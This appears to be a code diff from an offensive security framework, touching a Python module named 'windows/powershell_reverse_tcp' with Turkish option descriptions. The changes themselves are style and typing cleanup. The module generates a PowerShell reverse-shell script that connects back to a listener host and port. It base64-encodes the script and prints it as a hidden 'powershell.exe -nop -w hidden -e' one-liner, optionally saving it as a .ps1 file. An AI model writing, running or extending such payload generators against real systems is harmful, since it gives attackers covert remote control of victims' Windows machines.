@@ -1,7 +1,9 @@
+import base64
+from typing import Any
+
 from core.module import BaseModule
 from core.option import Option
-from typing import Dict, Any
-import base64
+
 
 class Payload(BaseModule):
     Name = "windows/powershell_reverse_tcp"
@@ -14,7 +16,13 @@ class Payload(BaseModule):
         self.Options = {
             "LHOST": Option("LHOST", "127.0.0.1", True, "Dinleyen IP."),
             "LPORT": Option("LPORT", 4444, True, "Dinleyen Port."),
-            "OUTPUT": Option("OUTPUT", "", False, "Payload'ı dosyaya kaydet (örn: payload.ps1/bat).", completion_dir=".")
+            "OUTPUT": Option(
+                "OUTPUT",
+                "",
+                False,
+                "Payload'ı dosyaya kaydet (örn: payload.ps1/bat).",
+                completion_dir=".",
+            ),
         }
 
     def generate(self) -> str:
@@ -37,14 +45,14 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
 $client.Close();
 """
         # Encode to Base64 (UTF-16LE for PowerShell -encodedCommand)
-        encoded_ps = base64.b64encode(raw_ps.encode('utf-16le')).decode('utf-8')
-        
+        encoded_ps = base64.b64encode(raw_ps.encode("utf-16le")).decode("utf-8")
+
         command = f"powershell.exe -nop -w hidden -e {encoded_ps}"
         return command
 
-    def run(self, options: Dict[str, Any]):
+    def run(self, options: dict[str, Any]):
         code = self.generate()
-        
+
         output_path = self.get_option_value("OUTPUT")
         if output_path:
             if not output_path.endswith(".ps1"):
@@ -59,7 +67,7 @@ $client.Close();
                 print(f"[!] Dosya yazma hatası: {e}")
                 return code
 
-        print(f"[*] PowerShell Payload (Base64 Encoded One-Liner):")
+        print("[*] PowerShell Payload (Base64 Encoded One-Liner):")
         print("-" * 50)
         print(code)
         print("-" * 50)
